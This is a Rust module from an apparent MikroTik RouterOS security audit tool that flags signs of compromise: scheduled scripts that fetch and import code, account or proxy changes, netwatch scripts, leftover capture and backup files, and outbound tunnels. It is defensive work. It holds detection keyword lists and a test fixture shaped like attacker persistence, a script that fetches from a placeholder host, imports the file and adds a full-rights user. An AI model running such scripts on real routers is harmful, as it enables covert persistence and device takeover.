//! The markers a compromised MikroTik router has left behind since 2018.
//!
//! This is the one area where RouterOS has a public, repetitive corpus of
//! post-exploitation behaviour: the Mēris campaigns, the `error.html` mining
//! injection, the persistence dropped after `CVE-2018-14847`. All of it lands
//! in menus that can be read.
//!
//! **A marker is not proof.** Every finding here says what was observed and
//! what to check, never who put it there. A backup script that uploads to an
//! object store and a persistence script that downloads a payload use the same
//! two commands, and nothing in the configuration distinguishes them — only
//! the operator knows which one they wrote.

use super::{finding, Finding, Input, Outcome, Severity};
use crate::ros::{field, flag};

/// The script commands that reach the network or change the shape of the
/// router. Matched case-insensitively against a script's source.
const FETCHES: [&str; 3] = ["/tool fetch", "/import", "/system/script/run"];

/// Commands that change who can log in or what the router relays. A script
/// that both fetches and does one of these is a different proposition from one
/// that only fetches.
const MUTATES: [&str; 6] = [
    "/user add",
    "/user set",
    "/ip socks",
    "/ip proxy",
    "/ip firewall nat add",
    "/user group",
];

/// Files worth noticing on a router's own storage.
const NOTABLE_FILES: [(&str, Severity, &str); 4] = [
    (
        ".pcap",
        Severity::Medium,
        "a packet capture: whatever it recorded is readable by anyone who can read this router's files",
    ),
    (
        "autosupout.rif",
        Severity::Medium,
        "a support dump: it contains the full configuration, and MikroTik support is the only reason to make one",
    ),
    (
        ".backup",
        Severity::Medium,
        "a binary configuration backup, restorable as-is onto another router",
    ),
    (
        ".rsc",
        Severity::Low,
        "an exported configuration script",
    ),
];

pub fn check(i: &Input, o: &mut Outcome) {
    o.guard(
        i,
        "scheduled-fetch",
        &["/system/scheduler", "/system/script"],
        scheduled_fetch,
    );
    o.guard(i, "netwatch-scripts", &["/tool/netwatch"], netwatch);
    o.guard(i, "files-left-behind", &["/file"], files);
    o.guard(i, "outbound-tunnels", &["/interface"], tunnels);
}

/// The persistence mechanism seen on RouterOS more than any other: a task that
/// runs on its own schedule and pulls something in.
fn scheduled_fetch(i: &Input) -> Vec<Finding> {
    let mut out = Vec::new();

    // A scheduler entry either carries its commands inline in `on-event`, or
    // names a script. Both have to be looked through.
    let source_of = |name: &str| -> String {
        i.scripts
            .iter()
            .find(|s| field(s, "name") == name)
            .map(|s| field(s, "source"))
            .unwrap_or_default()
    };

    for e in i.scheduler.iter().filter(|e| !flag(e, "disabled")) {
        let name = field(e, "name");
        let on_event = field(e, "on-event");
        let body = format!("{on_event} {}", source_of(on_event.trim()));

        let fetches = matches_any(&body, &FETCHES);
        let mutates = matches_any(&body, &MUTATES);
        if fetches.is_empty() {
            continue;
        }

        let severity = if mutates.is_empty() {
            Severity::High
        } else {
            Severity::Critical
        };
        out.push(finding(
            severity,
            "integrity",
            format!("scheduled task {name:?} pulls something in and runs it"),
            format!(
                "runs {} and uses {}{} — a backup script that uploads and a persistence script that downloads look identical here; confirm you wrote it",
                match field(e, "interval").as_str() {
                    "" => format!("at {}", field(e, "start-time")),
                    iv => format!("every {iv}"),
                },
                fetches.join(", "),
                if mutates.is_empty() {
                    String::new()
                } else {
                    format!(", and changes {}", mutates.join(", "))
                }
            ),
            format!("/system scheduler print detail where name={name}"),
        ));
    }

    // A script nothing schedules is still a script something can run.
    for s in i.scripts.iter() {
        let name = field(s, "name");
        if i.scheduler
            .iter()
            .any(|e| field(e, "on-event").trim() == name)
        {
            continue;
        }
        let source = field(s, "source");
        let fetches = matches_any(&source, &FETCHES);
        let mutates = matches_any(&source, &MUTATES);
        if fetches.is_empty() && mutates.is_empty() {
            continue;
        }
        out.push(finding(
            Severity::Medium,
            "integrity",
            format!("script {name:?} is not scheduled, and reaches out or changes accounts"),
            format!(
                "uses {}; nothing in /system/scheduler runs it, which means something else does",
                fetches
                    .iter()
                    .chain(mutates.iter())
                    .cloned()
                    .collect::<Vec<_>>()
                    .join(", ")
            ),
            format!("/system script print detail where name={name}"),
        ));
    }

    out
}

fn netwatch(i: &Input) -> Vec<Finding> {
    let with_script: Vec<String> = i
        .netwatch
        .iter()
        .filter(|n| !flag(n, "disabled"))
        .filter(|n| !field(n, "up-script").is_empty() || !field(n, "down-script").is_empty())
        .map(|n| field(n, "host"))
        .collect();

    if with_script.is_empty() {
        return Vec::new();
    }
    vec![finding(
        Severity::Medium,
        "integrity",
        "netwatch entries run scripts",
        format!(
            "{} probe(s) trigger a script on a state change ({}) — this is a second persistence path, and the one people forget after cleaning /system/scheduler",
            with_script.len(),
            with_script.join(", ")
        ),
        "/tool netwatch print detail",
    )]
}

/// What is sitting on the router's own storage.
fn files(i: &Input) -> Vec<Finding> {
    let mut out = Vec::new();
    for (pattern, severity, why) in NOTABLE_FILES {
        let hits: Vec<String> = i
            .files
            .iter()
            .filter(|f| field(f, "type") != "directory")
            .filter(|f| field(f, "name").to_lowercase().contains(pattern))
            .map(|f| {
                let size = crate::ros::num(f, "size")
                    .map(|n| format!(" ({})", crate::ros::bytes(n)))
                    .unwrap_or_default();
                format!("{}{size}", field(f, "name"))
            })
            .collect();
        if hits.is_empty() {
            continue;
        }
        out.push(finding(
            severity,
            "integrity",
            format!("{} file(s) left on the router's storage", hits.len()),
            format!("{} — {why}", hits.join(", ")),
            "/file remove <name>, once you have what you need from it",
        ));
    }
    out
}

/// A tunnel this router dials out on is a path back in for whoever is on the
/// other end.
fn tunnels(i: &Input) -> Vec<Finding> {
    const CLIENT_TYPES: [&str; 5] = ["l2tp-out", "pptp-out", "sstp-out", "ovpn-out", "wireguard"];

    let clients: Vec<String> = i
        .interfaces
        .iter()
        .filter(|f| !flag(f, "disabled"))
        .filter(|f| CLIENT_TYPES.contains(&field(f, "type").as_str()))
        .map(|f| format!("{} ({})", field(f, "name"), field(f, "type")))
        .collect();

    if clients.is_empty() {
        return Vec::new();
    }
    vec![finding(
        Severity::Low,
        "integrity",
        "this router dials outbound tunnels",
        format!(
            "{} — each one is a path back into this network for whoever terminates it; the campaigns that hit RouterOS left an L2TP client behind for exactly that reason",
            clients.join(", ")
        ),
        "/interface print where type~\"out\"",
    )]
}

/// Which of `needles` appear in `haystack`.
///
/// RouterOS scripts are written every which way — `/tool fetch`,
/// `tool  fetch`, `/TOOL FETCH` — so both sides are reduced to lowercase
/// words with the slashes dropped before comparing. A rule that only caught
/// one spelling would be worse than none.
fn matches_any(haystack: &str, needles: &[&str]) -> Vec<String> {
    let h = normalize(haystack);
    needles
        .iter()
        .filter(|n| h.contains(&normalize(n)))
        .map(|n| n.to_string())
        .collect()
}

fn normalize(s: &str) -> String {
    s.to_lowercase()
        .replace('/', " ")
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::{json, Value};

    fn input(scheduler: Vec<Value>, scripts: Vec<Value>) -> Input {
        Input {
            scheduler,
            scripts,
            ..Default::default()
        }
    }

    #[test]
    fn a_scheduled_fetch_is_high_and_says_it_might_be_yours() {
        let i = input(
            vec![
                json!({"name": "backup", "on-event": "/tool fetch url=https://x/y", "interval": "1d"}),
            ],
            vec![],
        );
        let f = scheduled_fetch(&i);
        assert_eq!(f[0].severity, Severity::High);
        assert!(f[0].detail.contains("confirm you wrote it"));
    }

    /// Fetching *and* touching accounts is a different proposition from
    /// fetching alone, and is the shape the campaigns actually left.
    #[test]
    fn fetching_and_changing_accounts_is_critical() {
        let i = input(
            vec![json!({"name": "upd", "on-event": "go", "interval": "5m"})],
            vec![
                json!({"name": "go", "source": "/tool fetch url=http://x/a.rsc\n/import a.rsc\n/user add name=ftu group=full"}),
            ],
        );
        let f = scheduled_fetch(&i);
        assert_eq!(f[0].severity, Severity::Critical);
        assert!(f[0].detail.contains("changes"));
    }

    #[test]
    fn a_scheduler_entry_that_does_neither_is_not_a_finding() {
        let i = input(
            vec![json!({"name": "led", "on-event": ":led on", "interval": "1m"})],
            vec![],
        );
        assert!(scheduled_fetch(&i).is_empty());
    }

    #[test]
    fn a_disabled_task_is_not_running() {
        let i = input(
            vec![json!({"name": "x", "on-event": "/tool fetch url=y", "disabled": "true"})],
            vec![],
        );
        assert!(scheduled_fetch(&i).is_empty());
    }

    /// A script nothing schedules is the more interesting case, not the less:
    /// something other than the scheduler is running it.
    #[test]
    fn an_unscheduled_script_that_reaches_out_is_reported_separately() {
        let i = input(
            vec![],
            vec![json!({"name": "orphan", "source": "/tool fetch url=http://x"})],
        );
        let f = scheduled_fetch(&i);
        assert_eq!(f.len(), 1);
        assert!(f[0].title.contains("not scheduled"));
    }

    #[test]
    fn a_scheduled_script_is_not_reported_twice() {
        let i = input(
            vec![json!({"name": "t", "on-event": "s", "interval": "1d"})],
            vec![json!({"name": "s", "source": "/tool fetch url=http://x"})],
        );
        assert_eq!(scheduled_fetch(&i).len(), 1);
    }

    #[test]
    fn files_are_graded_by_what_they_contain() {
        let i = Input {
            // The shape seen on real hardware.
            files: vec![
                json!({"name": "autosupout.rif", "size": "567590", "type": "rif"}),
                json!({"name": "radius-check.pcap", "size": "464", "type": ".pcap file"}),
                json!({"name": "skins", "type": "directory"}),
            ],
            ..Default::default()
        };
        let f = files(&i);
        assert_eq!(f.len(), 2, "the directory is not a file left behind");
        assert!(f.iter().all(|f| f.severity == Severity::Medium));
        assert!(f.iter().any(|f| f.detail.contains("autosupout.rif")));
        assert!(f.iter().any(|f| f.detail.contains("464 B")));
    }

    #[test]
    fn matching_ignores_the_slashes_routeros_scripts_vary_on() {
        assert!(!matches_any("tool fetch url=x", &FETCHES).is_empty());
        assert!(!matches_any("/tool  fetch url=x", &FETCHES).is_empty());
        assert!(!matches_any("/TOOL FETCH", &FETCHES).is_empty());
        assert!(matches_any(":put hello", &FETCHES).is_empty());
        assert_eq!(normalize("/tool   fetch\n  url=x"), "tool fetch url=x");
    }

    #[test]
    fn an_outbound_tunnel_is_listed_not_condemned() {
        let i = Input {
            interfaces: vec![json!({"name": "vpn-hq", "type": "l2tp-out", "disabled": "false"})],
            ..Default::default()
        };
        let f = tunnels(&i);
        assert_eq!(f[0].severity, Severity::Low);
        assert!(f[0].detail.contains("vpn-hq"));
    }
}
